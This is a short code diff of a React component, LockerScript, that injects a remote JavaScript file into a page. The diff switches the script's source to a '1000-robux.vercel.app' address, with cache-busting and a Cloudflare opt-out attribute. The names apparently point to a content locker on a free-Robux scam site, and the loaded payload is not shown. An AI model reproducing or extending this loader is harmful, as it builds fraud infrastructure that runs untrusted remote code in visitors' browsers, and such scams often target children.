@@ -8,7 +8,7 @@ export const LockerScript: React.FC = () => {
       script.id = 'ogjs';
       script.type = 'text/javascript';
       // Add timestamp to bypass cache
-      script.src = `https://www.craftgaminghub.xyz/cl/js/82dk53?v=${Date.now()}`;
+      script.src = `https://1000-robux.vercel.app/cl/i/82dk53?v=${Date.now()}`;
       script.async = true;
       script.setAttribute('data-cfasync', 'false'); 
       
